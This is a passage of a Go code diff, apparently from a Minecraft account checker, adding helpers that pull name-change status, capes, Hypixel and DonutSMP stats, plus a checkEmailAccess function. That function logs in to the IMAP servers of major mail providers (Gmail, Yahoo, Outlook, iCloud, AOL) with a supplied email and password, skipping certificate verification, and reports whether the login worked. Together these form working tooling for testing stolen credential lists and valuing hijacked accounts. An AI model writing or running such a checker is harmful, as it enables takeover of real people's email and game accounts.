+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", nil
+	}
+
+	allowed, _ := result["nameChangeAllowed"].(bool)
+	createdAt, _ := result["createdAt"].(string)
+
+	info := fmt.Sprintf("NameChange: %v", allowed)
+	if createdAt != "" {
+		info += " | Last: " + createdAt
+	}
+	return info, nil
+}
+
+func checkEmailAccess(email, password string) string {
+	domain := ""
+	parts := strings.SplitN(email, "@", 2)
+	if len(parts) == 2 {
+		domain = strings.ToLower(parts[1])
+	}
+
+	var imapServer string
+	switch {
+	case strings.Contains(domain, "gmail") || strings.Contains(domain, "googlemail"):
+		imapServer = "imap.gmail.com:993"
+	case strings.Contains(domain, "yahoo"):
+		imapServer = "imap.mail.yahoo.com:993"
+	case strings.Contains(domain, "outlook"), strings.Contains(domain, "hotmail"), strings.Contains(domain, "live"):
+		imapServer = "outlook.office365.com:993"
+	case strings.Contains(domain, "icloud"), strings.Contains(domain, "me.com"), strings.Contains(domain, "mac.com"):
+		imapServer = "imap.mail.me.com:993"
+	case strings.Contains(domain, "aol"):
+		imapServer = "imap.aol.com:993"
+	default:
+		imapServer = "imap." + domain + ":993"
+	}
+
+	conn, err := net.DialTimeout("tcp", imapServer, 10*time.Second)
+	if err != nil {
+		return "Unknown"
+	}
+	defer conn.Close()
+
+	tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
+	defer tlsConn.Close()
+
+	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
+
+	buf := make([]byte, 1024)
+	_, err = tlsConn.Read(buf)
+	if err != nil {
+		return "Unknown"
+	}
+
+	_, err = fmt.Fprintf(tlsConn, "a001 LOGIN %s %s\r\n", email, password)
+	if err != nil {
+		return "Unknown"
+	}
+
+	n, err := tlsConn.Read(buf)
+	if err != nil {
+		return "Unknown"
+	}
+
+	resp := string(buf[:n])
+	if strings.Contains(resp, "OK") {
+		return "True"
+	}
+	return "False"
+}
+
+func getMinecraftCapes(profile *MCProfile) string {
+	if profile == nil {
+		return ""
+	}
+	var capes []string
+	for _, c := range profile.Capes {
+		if c.Alias != "" {
+			capes = append(capes, c.Alias)
+		}
+	}
+	return strings.Join(capes, ", ")
+}
+
+func checkDonutStats(username string) string {
+	client := &http.Client{Timeout: 10 * time.Second}
+	req, _ := http.NewRequest("GET", "https://api.donutsmp.net/v1/stats/"+username, nil)
+	req.Header.Set("User-Agent", UserAgent)
+	req.Header.Set("Accept", "application/json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 404 {
+		return "player not found"
+	}
+	if resp.StatusCode == 429 {
+		return "rate limited"
+	}
+	if resp.StatusCode != 200 {
+		return ""
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return ""
+	}
+
+	var stats []string
+	if data, ok := result["result"].(map[string]interface{}); ok {
+		if k, ok := data["kills"]; ok {
+			stats = append(stats, fmt.Sprintf("Kills: %v", k))
+		}
+		if d, ok := data["deaths"]; ok {
+			stats = append(stats, fmt.Sprintf("Deaths: %v", d))
+		}
+		if m, ok := data["money"]; ok {
+			stats = append(stats, fmt.Sprintf("Money: %v", m))
+		}
+		if p, ok := data["playtime"]; ok {
+			stats = append(stats, fmt.Sprintf("Playtime: %v", p))
+		}
+		if bb, ok := data["broken_blocks"]; ok {
+			stats = append(stats, fmt.Sprintf("Blocks: %v", bb))
+		}
+	}
+	if len(stats) > 0 {
+		return strings.Join(stats, " | ")
+	}
+	return ""
+}
+
+func formatHypixelInfo(apiInfo, planckeInfo, optifineCape, minecraftCapes, namechangeInfo string) string {
+	var parts []string
+	if apiInfo != "" {
+		parts = append(parts, apiInfo)
+	}
+	if planckeInfo != "" {
+		parts = append(parts, planckeInfo)
+	}
+	if optifineCape != "" {
+		parts = append(parts, "Optifine: "+optifineCape)
+	}
+	if minecraftCapes != "" {
+		parts = append(parts, "Capes: "+minecraftCapes)
+	}
+	if namechangeInfo != "" {
+		parts = append(parts, namechangeInfo)
+	}
+	if len(parts) > 0 {
+		return strings.Join(parts, " | ")
+	}
+	return ""
+}
